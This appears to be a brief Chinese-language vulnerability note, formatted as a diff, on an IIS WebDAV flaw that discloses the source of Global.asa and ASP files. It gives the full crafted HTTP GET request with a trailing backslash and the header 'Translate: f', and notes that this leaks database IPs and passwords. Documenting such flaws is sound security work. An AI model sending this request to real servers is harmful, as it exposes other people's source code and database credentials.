@@ -1,0 +1,13 @@
+当IIS在webdav功能开启的状态下。如果web使用了Global.asa这个文件结构，可以通过特殊HTTP请求，看到其源代码。造成数据库IP和口令泄露。
+
+XML/HTML代码
+GET /global.asa\ HTTP/1.0    
+Accept: */*    
+Accept-Language: en-US    
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)    
+Host: 127.0.0.1    
+Referer: http://www.0e0.com.cn/    
+Translate: f    
+Content-Type: application/x-www-form-urlencoded    
+
+在webdav和脚本资源访问都打开的情况下，通过上边的请求，可以看到ASP等文件的源代码。而webdav都是默认打开的，所以当打开脚本资源访问选项时就会激活此问题
